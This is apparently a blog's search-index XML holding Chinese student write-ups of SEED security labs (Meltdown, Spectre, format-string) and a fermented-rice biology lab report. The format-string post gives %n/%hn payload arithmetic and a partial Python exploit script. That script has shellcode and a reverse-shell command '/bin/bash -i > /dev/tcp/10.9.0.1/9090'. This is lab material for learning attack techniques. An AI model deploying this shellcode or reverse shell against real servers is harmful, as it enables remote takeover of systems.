<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>meltdown lab</title>
    <link href="/2021/05/27/meltdown-lab/"/>
    <url>/2021/05/27/meltdown-lab/</url>
    
    <content type="html"><![CDATA[<h2 id="Meltdown"><a href="#Meltdown" class="headerlink" title="Meltdown"></a>Meltdown</h2><h3 id="Task-1-Reading-from-Cache-versus-from-Memory"><a href="#Task-1-Reading-from-Cache-versus-from-Memory" class="headerlink" title="Task 1: Reading from Cache versus from Memory"></a>Task 1: Reading from Cache versus from Memory</h3><p>多次运行 CacheTime 程序，访问 Cache 的时间明显短于访问内存的时间，选择80作为阈值</p><p><img src="/2021/05/27/meltdown-lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><h3 id="Task-2-Using-Cache-as-a-Side-Channel"><a href="#Task-2-Using-Cache-as-a-Side-Channel" class="headerlink" title="Task 2: Using Cache as a Side Channel"></a>Task 2: Using Cache as a Side Channel</h3><p><img src="/2021/05/27/meltdown-lab/2.PNG" srcset="/img/loading.gif" alt="2"></p><h3 id="Tasks-3-5-Preparation-for-the-Meltdown-Attack"><a href="#Tasks-3-5-Preparation-for-the-Meltdown-Attack" class="headerlink" title="Tasks 3-5: Preparation for the Meltdown Attack"></a>Tasks 3-5: Preparation for the Meltdown Attack</h3><p>meltdown攻击需要具有两个条件：</p><ol><li>需要知道secret的地址</li><li>secret需要存在cache当中</li></ol><p>运行命令之后能够得到相应的地址</p><p><img src="/2021/05/27/meltdown-lab/3.PNG" srcset="/img/loading.gif" alt="3"></p><h3 id="Task-4-Access-Kernel-Memory-from-User-Space"><a href="#Task-4-Access-Kernel-Memory-from-User-Space" class="headerlink" title="Task 4: Access Kernel Memory from User Space"></a>Task 4: Access Kernel Memory from User Space</h3><p><img src="/2021/05/27/meltdown-lab/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>第二行并不会被执行，发生段错误</p><h3 id="Task-5-Handle-Error-Exceptions-in-C"><a href="#Task-5-Handle-Error-Exceptions-in-C" class="headerlink" title="Task 5: Handle Error/Exceptions in C"></a>Task 5: Handle Error/Exceptions in C</h3><p><img src="/2021/05/27/meltdown-lab/5.PNG" srcset="/img/loading.gif" alt="5"></p><h3 id="Task-6-Out-of-Order-Execution-by-CPU"><a href="#Task-6-Out-of-Order-Execution-by-CPU" class="headerlink" title="Task 6: Out-of-Order Execution by CPU"></a>Task 6: Out-of-Order Execution by CPU</h3><p>逻辑过程，首先先将cache进行flush，然后在访问内存的时候触发一个中断异常，然后根据处理函数进行处理。之后回滚到之前的checkpoint，进入else分支当中。然后之后通过reload来查看对应缓存的条目</p><p>说明在等待询问数据是否合法的时候，secret已经在cache当中</p><p><img src="/2021/05/27/meltdown-lab/6.PNG" srcset="/img/loading.gif" alt="6"></p><h3 id="Task-7-1-A-Naive-Approach"><a href="#Task-7-1-A-Naive-Approach" class="headerlink" title="Task 7.1: A Naive Approach"></a>Task 7.1: A Naive Approach</h3><p><img src="/2021/05/27/meltdown-lab/7.PNG" srcset="/img/loading.gif" alt="7"></p><h3 id="Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached"><a href="#Task-7-2-Improve-the-Attack-by-Getting-the-Secret-Data-Cached" class="headerlink" title="Task 7.2: Improve the Attack by Getting the Secret Data Cached"></a>Task 7.2: Improve the Attack by Getting the Secret Data Cached</h3><p><img src="/2021/05/27/meltdown-lab/8.PNG" srcset="/img/loading.gif" alt="8"></p><h3 id="Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown"><a href="#Task-7-3-Using-Assembly-Code-to-Trigger-Meltdown" class="headerlink" title="Task 7.3: Using Assembly Code to Trigger Meltdown"></a>Task 7.3: Using Assembly Code to Trigger Meltdown</h3><p><img src="/2021/05/27/meltdown-lab/9.PNG" srcset="/img/loading.gif" alt="9"></p><h3 id="Task-8-Make-the-Attack-More-Practical"><a href="#Task-8-Make-the-Attack-More-Practical" class="headerlink" title="Task 8: Make the Attack More Practical"></a>Task 8: Make the Attack More Practical</h3><p><img src="/2021/05/27/meltdown-lab/10.PNG" srcset="/img/loading.gif" alt="10"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>spectre_attack lab</title>
    <link href="/2021/05/27/spectre-attack-lab/"/>
    <url>/2021/05/27/spectre-attack-lab/</url>
    
    <content type="html"><![CDATA[<h2 id="Spectre-attack-lab"><a href="#Spectre-attack-lab" class="headerlink" title="Spectre attack lab"></a>Spectre attack lab</h2><p>CPU的漏洞使得恶意程序能够破环进程间的保护机制（硬件）和进程内的保护机制（软件），从而使得而已程序徐能够从不允许访问的区域读取数据</p><h3 id="task-1-amp-2：Side-Channel-Attack-via-CPU-Cache"><a href="#task-1-amp-2：Side-Channel-Attack-via-CPU-Cache" class="headerlink" title="task 1&amp;2：Side Channel Attack via CPU Cache"></a>task 1&amp;2：Side Channel Attack via CPU Cache</h3><p>使用CPU缓存来作为侧信道从而窃取信息</p><p><img src="/2021/05/27/spectre-attack-lab/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>多次运行CacheTime，发现访问缓存的时间明显短于访问内存的时间，选择阈值为100</p><p><img src="/2021/05/27/spectre-attack-lab/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>task2的原理就是，当一个秘密数据被访问的时候，它的缓存中应该有记录，那么之后进行重新加载数组的时候就可以得知</p><p><img src="/2021/05/27/spectre-attack-lab/3.PNG" srcset="/img/loading.gif" alt="3"></p><p><strong>这里的数组空间还是有疑问</strong></p><p><img src="/2021/05/27/spectre-attack-lab/4.PNG" srcset="/img/loading.gif" alt="4"></p><h3 id="Task-3-Out-of-Order-Execution-and-Branch-Prediction"><a href="#Task-3-Out-of-Order-Execution-and-Branch-Prediction" class="headerlink" title="Task 3: Out-of-Order Execution and Branch Prediction"></a>Task 3: Out-of-Order Execution and Branch Prediction</h3><p>了解CPU当中的无需执行</p><blockquote><p>无序执行是一种优化技术，它允许CPU最大化其所有执行单元的利用率。CPU不是严格按顺序处理指令，而是在所有所需资源可用时立即并行执行指令。当当前操作的执行单元被占用时，其他执行单元可以向前运行。</p></blockquote><p><img src="/2021/05/27/spectre-attack-lab/5.PNG" srcset="/img/loading.gif" alt="5"></p><blockquote><p>如果这种执行不应该发生，它们会消除无序执行对寄存器和内存的影响，因此执行不会导致任何可见的效果。然而，他们忘记了一件事，对CPU缓存的影响。在无序执行过程中，引用的内存被提取到寄存器中，并且也存储在缓存中。如果必须丢弃无序执行的结果，则还应丢弃由执行引起的缓存。不幸的是，这不是大多数CPU的情况。</p></blockquote><p>程序先清除cache缓存，之后if来进行分支预测。当落到true的时候，通过reload来查看cache当中的条目</p><p><img src="/2021/05/27/spectre-attack-lab/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>可以看到此时的secret被加载到了cache当中，说明这时候if分支会执行后面的语句</p><p>注释掉代码之后再次执行，会发现成功率很低，分析原因：</p><p>当注释掉之后，没有对clflush来清除size的缓存，此时victim当中的判断语句能够很快的从cache当中读取到size的值，也就很快能够确定应该执行哪个分支。所以，如果分支预测错误并且读取到的数据还没有加载到cache当中，此时攻击就会失败</p><p><img src="/2021/05/27/spectre-attack-lab/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>改变victim参数为i + 20，发现成功率也是非常低的，这是由于在训练过程中总是会false，所以在之后选择的时候会选择false分支，也就不执行后续语句</p><p><img src="/2021/05/27/spectre-attack-lab/8.PNG" srcset="/img/loading.gif" alt="8"></p><h3 id="Task-4-The-Spectre-Attack"><a href="#Task-4-The-Spectre-Attack" class="headerlink" title="Task 4: The Spectre Attack"></a>Task 4: The Spectre Attack</h3><blockquote><p>如果机密数据在另一个进程中，则硬件级别的进程隔离可以防止进程从另一个进程窃取数据。如果数据处于同一进程中，则通常通过软件（如沙盒机制）进行保护。幽灵攻击可以针对这两种类型的秘密发起。</p></blockquote><blockquote><p>当在浏览器中打开来自不同服务器的网页时，它们通常是在同一个过程中打开的。浏览器内部实现的沙盒将为这些页面提供一个隔离的环境，因此一个页面将无法访问另一个页面的数据。大多数软件保护依赖于条件检查来决定是否应该授予访问权限。通过幽灵攻击，即使条件检查失败，我们也可以让CPU执行（无序的）受保护的代码分支，基本上破坏了访问检查。</p></blockquote><p><img src="/2021/05/27/spectre-attack-lab/9.PNG" srcset="/img/loading.gif" alt="9"></p><p><img src="/2021/05/27/spectre-attack-lab/10.PNG" srcset="/img/loading.gif" alt="10"></p><h3 id="Task-5-Improve-the-Attack-Accuracy"><a href="#Task-5-Improve-the-Attack-Accuracy" class="headerlink" title="Task 5: Improve the Attack Accuracy"></a>Task 5: Improve the Attack Accuracy</h3><blockquote><p>可以观察到结果确实有一些噪声，并且结果并不总是准确的。这是因为CPU有时会在缓存中加载额外的值，希望在以后某个时候使用，或者阈值不是很准确。缓存中的噪声会影响我们的攻击结果。我们需要执行多次攻击；我们可以使用以下代码来自动执行任务，而不是手动执行。</p></blockquote><p>编译运行SpectreAttackImproved，发现每次打印secret都是0</p><p>这是由于在调用restrictedAccess后，会根据返回结果访问相应的数据。而由于secret 存储在 buffer 外，所以 restrictedAccess 函数每次都会返回 0，所以每次都会访问 0 对应的数据， 使得 0 的 hit 次数最</p><p>修改代码，在查找分数最高的数据时，不包括 0</p><p><img src="/2021/05/27/spectre-attack-lab/12.PNG" srcset="/img/loading.gif" alt="12"></p><p><img src="/2021/05/27/spectre-attack-lab/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>同时，修改unsleep（增大休眠时间）成功率会增加</p><h3 id="Task-6-Steal-the-Entire-Secret-String"><a href="#Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="Task 6: Steal the Entire Secret String"></a>Task 6: Steal the Entire Secret String</h3><p>修改 main 函数，每次将 secret 指针移动 1B，依次打印出所有字节</p><p><img src="/2021/05/27/spectre-attack-lab/14.PNG" srcset="/img/loading.gif" alt="14"></p><p><img src="/2021/05/27/spectre-attack-lab/13.PNG" srcset="/img/loading.gif" alt="13"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Software Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>生物技术实验报告</title>
    <link href="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"/>
    <url>/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/</url>
    
    <content type="html"><![CDATA[<h2 id="酒酿制作及微生物观察"><a href="#酒酿制作及微生物观察" class="headerlink" title="酒酿制作及微生物观察"></a>酒酿制作及微生物观察</h2><p>[TOC]</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ul><li>了解酒酿的制作过程以及原理</li><li>分离并观察<strong>酒曲</strong>当中的微生物</li><li>分离并观察<strong>酒酿</strong>当中的微生物</li></ul><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>甜酒曲是主要的发酵制剂。甜酒曲是糖化菌及酵母制剂，其所含的微生物主要有根霉、毛霉及少量酵母。</p><p>糯米的主要成分是淀粉（多糖的一种），尤其以支链淀粉为主。撒上酒曲后，首先根霉菌和酵母菌开始繁殖，根霉菌能产生淀粉酶，将淀粉水解成为葡萄糖。酒酿表面的白醭就是根霉的菌丝。</p><p>随后，葡萄糖在无氧条件下在真菌细胞内发生糖酵解代谢，将葡萄糖分解成为酒精和二氧化碳</p><h3 id="实验材料"><a href="#实验材料" class="headerlink" title="实验材料"></a>实验材料</h3><ul><li>糯米100g、甜酒曲1包。</li><li>2块YPD培养基平板、1个玻璃三角瓶（注：在实验过程中，由于玻璃三角瓶瓶口过细不易讲酒酿放入，将一部分酒酿放入了自备的碗中培养）</li><li>无菌棉签（或牙签）、保鲜膜等</li></ul><h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><h5 id="制备酒酿"><a href="#制备酒酿" class="headerlink" title="制备酒酿"></a>制备酒酿</h5><ol><li><p>首先先将糯米用清水淘洗干净，直到淘米水清澈不浑浊为止，然后我选择用干净的小碗盛放糯米并且用水浸泡了6个小时，此时糯米能够用手轻易碾碎。然后在碗内放一个纱布，加入少量的水</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/1.jpg" srcset="/img/loading.gif" alt="1"></p><p> 然后将糯米放在微波炉当中进行加热，先中火4min，然后焖5分钟之后再用中火加热5-7min。此时糯米已经完全熟透，无夹生</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/2.jpg" srcset="/img/loading.gif" alt="2"></p><p> 待糯米降温到35摄氏度的时候加入少量的水并且撒酒曲，注意此时酒曲应尽量均匀，用量大概是2kg糯米对应8g的酒曲，所以我大概是用了0.4g</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/3.jpg" srcset="/img/loading.gif" alt="3"></p></li><li><p>用勺子轻轻压平并且用筷子再中间挖出一个小窝来方便观察酒酿的产生情况，之后在表面再撒一些酒曲</p></li><li><p>用保鲜膜覆盖容器，放在大概30摄氏度的环境当中，我将容器放在被子当中来保温</p></li><li><p>发酵大概48小时之后，此时掀开保鲜膜，已经能够闻到较为明显的酒香味和甜味，开始进行后续的微生物培养</p></li></ol><h5 id="微生物培养"><a href="#微生物培养" class="headerlink" title="微生物培养"></a>微生物培养</h5><h6 id="酒曲当中的微生物"><a href="#酒曲当中的微生物" class="headerlink" title="酒曲当中的微生物"></a>酒曲当中的微生物</h6><p>采用平板划线法，用无菌棉签（或牙签）沾取少许<strong>酒曲</strong>划线YPD平板1块，倒置培养皿培养两到三天</p><h6 id="酒酿当中的微生物"><a href="#酒酿当中的微生物" class="headerlink" title="酒酿当中的微生物"></a>酒酿当中的微生物</h6><p>采用平板划线法，用无菌棉签（或牙签）沾取少许<strong>酒酿</strong>划线YPD平板1块，倒置培养皿培养两到三天<strong>（在这里由于时间不足，明显我的培养时间不够，大概是1天左右，所以菌落的生长情况并不好）</strong></p><h5 id="观察微生物"><a href="#观察微生物" class="headerlink" title="观察微生物"></a>观察微生物</h5><p> 在这一步当中按照老师的观察指导，用载玻片、盖玻片，显微镜来进行观察根霉菌和酵母菌</p><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><ol><li><p>酒酿观察：产出的酒酿从颜色上来看稍微显黄，具有较浓的酒香味和甜味，但是品尝后发现会有淡淡的酸味产生</p></li><li><p>微生物观察：</p><p> <strong>根霉菌</strong>：观察到丝状菌丝以及黑点状的菌体，同时，再培养皿当中，具有一些肉眼可以观察到的黑点，思考后认为是根霉菌在进行孢子繁殖时产生的孢子</p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/4.jpg" srcset="/img/loading.gif" alt="4"></p><p> <img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/5.jpg" srcset="/img/loading.gif" alt="5"></p></li></ol><p><strong>酵母菌</strong>：酵母菌整体呈现出无色透明的椭圆状，下面图片当中有一张是在拍摄当中手机变焦所以形状偏大</p><p><img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/6.jpg" srcset="/img/loading.gif" alt="6"></p><p><img src="/2021/05/25/%E7%94%9F%E7%89%A9%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/7.jpg" srcset="/img/loading.gif" alt="7"></p><h3 id="分析讨论"><a href="#分析讨论" class="headerlink" title="分析讨论"></a>分析讨论</h3><ul><li><p>首先，是对于具体的发酵过程的分析：在撒上就去之后，根霉菌和酵母菌开始进行繁殖，根霉菌能产生淀粉酶，将淀粉水解成为葡萄糖。酒酿表面的白醭就是根霉的菌丝。</p><p>  之后，在无氧条件下葡萄糖在真菌细胞内发生糖酵解代谢，将葡萄糖分解成为酒精和二氧化碳：</p><p>  C6H12O6 → 2 C2H5OH + 2 CO2</p><p>  而如果发酵时间过长，则会产生醋酸，这也是<strong>为什么会产生酸味的原因</strong></p><p>  2 C2H5OH + O2 → CH3COOH + H2O</p></li><li><p>思考制作过程中为什么要控制好温度和含氧量，具体会对哪写过程产生影响</p><p>  温度对于发酵过程产生多方面影响。首先，它会影响各种酶的活性从而影响反应速率；两外会改变菌体代谢产物的合成方向，影响微生物的代谢调控机制；另外，还会会对例如溶解度等产生影响。而酵母菌在含氧丰富的条件下进行有氧呼吸，不同含氧量产生的代谢产物也是不同的，从而影响酒酿品质</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>改变生活的生物技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Format-String lab</title>
    <link href="/2021/05/12/Format-String-lab-1/"/>
    <url>/2021/05/12/Format-String-lab-1/</url>
    
    <content type="html"><![CDATA[<h1 id="Format-String"><a href="#Format-String" class="headerlink" title="Format String"></a>Format String</h1><h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>是通过printf系列的变量来执行恶意代码等</p><blockquote><p>The way how the input data is fed into the printf() function is unsafe, and it leads to a format-string vulnerability</p><p>最终目标是将代码注入到服务器程序的堆栈中，然后触发代码</p></blockquote><h2 id="Task-1-Crashing-the-Program"><a href="#Task-1-Crashing-the-Program" class="headerlink" title="Task 1: Crashing the Program"></a>Task 1: Crashing the Program</h2><p>针对第一个task，有两个方法：1 是针对于不能读的地方进行读取，2 是针对于不能写的地方进行写</p><p><img src="/2021/05/12/Format-String-lab-1/1.PNG" srcset="/img/loading.gif" alt="1"></p><p>但是运行后发现会return properly，仔细分析后发现是由于%d只是简单的访问栈上面中的参数，并且把参数换成10进制来输出，并不会访问什么不该访问的</p><p>所以，我们通过%s来进行攻击</p><p><img src="/2021/05/12/Format-String-lab-1/2.PNG" srcset="/img/loading.gif" alt="2"></p><p>可以发现此时没有正确的return</p><h4 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h4><p>在这一题里面，我们想让程序不能正确返回的思路是正确的，读取内存当中不能被读取的内容或者往内存当中不能写的地方写</p><p>printf函数原型</p><p><img src="/2021/05/12/Format-String-lab-1/3.PNG" srcset="/img/loading.gif" alt="3"></p><h2 id="Task-2-Printing-Out-the-Server-Program’s-Memory"><a href="#Task-2-Printing-Out-the-Server-Program’s-Memory" class="headerlink" title="Task 2: Printing Out the Server Program’s Memory"></a>Task 2: Printing Out the Server Program’s Memory</h2><blockquote><p>此任务的目标是让服务器从内存中打印出一些数据（我们将继续使用10.9.0.5）。数据将在服务器端打印出来，因此攻击者无法看到它。因此，这不是一个有意义的攻击，但此任务中使用的技术对于后续任务至关重要。</p></blockquote><h4 id="Task-2-A-Stack-Data"><a href="#Task-2-A-Stack-Data" class="headerlink" title="Task 2.A: Stack Data"></a>Task 2.A: Stack Data</h4><p>此时，buffer作为局部变量是放在栈上面的，一共有1500个字节，在这里，我们需要知道在format string和buf起始地址之间的相对偏移量</p><p>首先，我们能够知道bufferr在栈上面的位置是<code>0xffffd660</code></p><p><img src="/2021/05/12/Format-String-lab-1/4.PNG" srcset="/img/loading.gif" alt="4"></p><p>原本想着是通过gdb调试来看到printf里面的return address，后来发现是自己傻了，那么多次调用printf，怎么看。。。</p><p>后来就直接通过调整%x的数量来看了。。。</p><p>当为%数量为64的时候，发现会正好</p><p><img src="/2021/05/12/Format-String-lab-1/5.PNG" srcset="/img/loading.gif" alt="5">)<img src="/2021/05/12/Format-String-lab-1/6.PNG" srcset="/img/loading.gif" alt="6"></p><p>也就是说，buffer起始的字符串会是第64个参数</p><h4 id="Task-2-B-Heap-Data"><a href="#Task-2-B-Heap-Data" class="headerlink" title="Task 2.B: Heap Data"></a>Task 2.B: Heap Data</h4><p>在这里的话，就是需要我们来打印作为全局变量存放在heap当中的secret字符串</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> *secret = <span class="hljs-string">"A secret message\n"</span>;</code></pre><p>最开始想到的就是%s，然后将format string上面的第一个参数设置为&amp;secret，但是问题怎么进行修改</p><p>之后想到能直接读取第64位的参数，而这个参数正好是buffer的起始位置</p><p>我们根据提示能够得到对应的在heap当中的地址</p><p><img src="/2021/05/12/Format-String-lab-1/7.PNG" srcset="/img/loading.gif" alt="7"></p><p>然后构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/9.PNG" srcset="/img/loading.gif" alt="9"></p><p>可以看到，对应字符串内容被打印出来了</p><p><img src="/2021/05/12/Format-String-lab-1/8.PNG" srcset="/img/loading.gif" alt="8"></p><h4 id="复盘-1"><a href="#复盘-1" class="headerlink" title="复盘"></a>复盘</h4><p>这个task当中最开始的目标就是打印出来对应的数据，注意在printf当中打印的规则，首先会将buffer当中的常规的字符打印出来，而遇到对应的占位符的时候，会根据参数来进行解析，以%s为例，当在buffer中遇到的时候，会来解析，比如将第一个参数对应存储位置里面的数据作为地址来进行寻址，然后打印出内存当中对应位置的字符串</p><h2 id="Task-3-Modifying-the-Server-Program’s-Memory"><a href="#Task-3-Modifying-the-Server-Program’s-Memory" class="headerlink" title="Task 3: Modifying the Server Program’s Memory"></a>Task 3: Modifying the Server Program’s Memory</h2><p>这个task的目标是修改对应的target的值/一些影响程序执行的值，首先明确target是存放在heap当中的，然后根据提示信息来获取target的位置信息</p><p><img src="/2021/05/12/Format-String-lab-1/10.PNG" srcset="/img/loading.gif" alt="10"></p><p>可以看到地址为<code>0x080e5068</code></p><h4 id="Task-3-A-Change-the-value-to-a-different-value"><a href="#Task-3-A-Change-the-value-to-a-different-value" class="headerlink" title="Task 3.A: Change the value to a different value"></a>Task 3.A: Change the value to a different value</h4><p>修改内存当中数据的一个重要方式是通过%n</p><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/12.PNG" srcset="/img/loading.gif" alt="12"></p><p><img src="/2021/05/12/Format-String-lab-1/11.PNG" srcset="/img/loading.gif" alt="11"></p><p>可以看到对应的target的值已经从原来的0x11223344变成了0x4</p><h4 id="Task-3-B-Change-the-value-to-0x5000"><a href="#Task-3-B-Change-the-value-to-0x5000" class="headerlink" title="Task 3.B: Change the value to 0x5000"></a>Task 3.B: Change the value to 0x5000</h4><p>因为我们现在只是通过%n将对应的位置修改为了0x4，而目标是修改为0x5000，</p><blockquote><p>这里我们需要定向修改，因此必须输出额外的字符作为填充。这里我们插入了%1276x（1276 = 0x4FC = 0x500 - 0x4），程序会把输出的值强制扩展到1276位</p></blockquote><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/114.PNG" srcset="/img/loading.gif" alt="114"></p><p><img src="/2021/05/12/Format-String-lab-1/13.PNG" srcset="/img/loading.gif" alt="13"></p><h4 id="Task-3-C-Change-the-value-to-0xAABBCCDD"><a href="#Task-3-C-Change-the-value-to-0xAABBCCDD" class="headerlink" title="Task 3.C: Change the value to 0xAABBCCDD"></a>Task 3.C: Change the value to 0xAABBCCDD</h4><blockquote><p>当我们需要把内存中的某个值修改为一个非常大的数时，如果直接使用%n写入的话，那么需要提前输出数量巨大的字符，这会消耗非常多的时间，因而，如果我们希望改写一个地址，最好使用%hn，他一次写入两个字节而非四个，此外还有%hhn，一次写入一个字节<br>于是，我们试图向0x080e5068和0x080e506A中分别写入0xCCDD和0xAABB此时问题出现了：当我们需要把内存中的某个值修改为一个非常小的数时，因为我们在前面必须输出一些字符以确定修改的地址，那么看上去，我们所能修改的值看上去是有下界的（比如在这里，看上去我们不能实现小于8的值的写入），但是实际上，我们可以通过溢出来解决这个问题——因为我们只写两个字节，所以0x0000和0x10000的效果是一样的，因此高低地址要填充的字节数可以如下计算：<br>低地址 ： low_adr - 8 if low_adr &gt; 8 else low_adr + 0x10000 - 8 = 65528<br>高地址 ： high_adr - low_adr if high_adr &gt; low_adr else high_adr + 0x10000 - low_adr = 65433</p></blockquote><p>在这里，我们所需要算的是0XCCDD - 8 = 52,437，0xAABB - 0xCCDD = 56,798（注意借位）</p><p>构造payload</p><p><img src="/2021/05/12/Format-String-lab-1/16.PNG" srcset="/img/loading.gif" alt="16"></p><p><img src="/2021/05/12/Format-String-lab-1/15.PNG" srcset="/img/loading.gif" alt="15"></p><h2 id="Task-4-Inject-Malicious-Code-into-the-Server-Program"><a href="#Task-4-Inject-Malicious-Code-into-the-Server-Program" class="headerlink" title="Task 4: Inject Malicious Code into the Server Program"></a>Task 4: Inject Malicious Code into the Server Program</h2><p>Q1：我们可以根据提示信息来获取buffer的起始位置为<code>0xffffd650</code></p><p>我们先来通过gdb来找myprintf中return 的地址</p><p><img src="/2021/05/12/Format-String-lab-1/17.PNG" srcset="/img/loading.gif" alt="17"></p><p>所以return address当中应该放的是0x8049f7e</p><p>之后来找return address的内存位置，根据之前打印的stack上面的情况，可以看到return address所在位置是第11个参数，与buffer起始位置相距212个字节，之后相减，0xffffd650 - 0xd4 = 0xFFFFD57C</p><p>Q2：64个%x</p><p>构造payload</p><p>此时，将shellcode放在距离buffer起始位置0x100处，地址位0xffffd750</p><p>其中，0xFFFFD57C需要存放0xd750，- 8后需要填充55112，而较高位0xFFFFD57E需要存放0xFFFF，需要填充0xFFFF - 0xD750 = 0x28AF =10415</p><pre><code class="hljs c">#!/usr/bin/python3<span class="hljs-keyword">import</span> sys# <span class="hljs-number">32</span>-<span class="hljs-built_in">bit</span> Generic Shellcode shellcode_32 = (   <span class="hljs-string">"\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"</span>   <span class="hljs-string">"\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"</span>   <span class="hljs-string">"\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"</span>   <span class="hljs-string">"/bin/bash*"</span>   <span class="hljs-string">"-c*"</span>   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *  #<span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>   <span class="hljs-string">"/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *"</span>   <span class="hljs-string">"AAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>   <span class="hljs-string">"BBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>   <span class="hljs-string">"CCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>   <span class="hljs-string">"DDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>).encode('latin-1')# <span class="hljs-number">64</span>-<span class="hljs-built_in">bit</span> Generic Shellcode shellcode_64 = (   <span class="hljs-string">"\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"</span>   <span class="hljs-string">"\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"</span>   <span class="hljs-string">"\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"</span>   <span class="hljs-string">"\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"</span>   <span class="hljs-string">"/bin/bash*"</span>   <span class="hljs-string">"-c*"</span>   # The * in <span class="hljs-keyword">this</span> <span class="hljs-built_in">line</span> serves as the <span class="hljs-built_in">position</span> marker         *   <span class="hljs-string">"/bin/ls -l; echo '===== Success! ======'                  *"</span>   <span class="hljs-string">"AAAAAAAA"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">0</span>] --&gt; <span class="hljs-string">"/bin/bash"</span>   <span class="hljs-string">"BBBBBBBB"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">1</span>] --&gt; <span class="hljs-string">"-c"</span>   <span class="hljs-string">"CCCCCCCC"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">2</span>] --&gt; the command <span class="hljs-built_in">string</span>   <span class="hljs-string">"DDDDDDDD"</span>   # Placeholder <span class="hljs-keyword">for</span> argv[<span class="hljs-number">3</span>] --&gt; <span class="hljs-literal">NULL</span>).encode('latin-1')N = <span class="hljs-number">1500</span># Fill the content with NOP<span class="hljs-number">'</span>scontent = bytearray(<span class="hljs-number">0x90</span> <span class="hljs-keyword">for</span> i in range(N))# Choose the shellcode version based on your targetshellcode = shellcode_32# Put the shellcode somewhere in the payloadstart = <span class="hljs-number">0x100</span>             # Change <span class="hljs-keyword">this</span> numbercontent[start:start + len(shellcode)] = shellcode##############################################################    Construct the format <span class="hljs-built_in">string</span> here# ############################################################ret_low = <span class="hljs-number">0xFFFFD57C</span>content[0:4]  =  (ret_low).to_bytes(4,byteorder='little')ret_high = <span class="hljs-number">0xFFFFD57E</span>content[4:8]  =  (ret_high).to_bytes(4,byteorder='little')s = <span 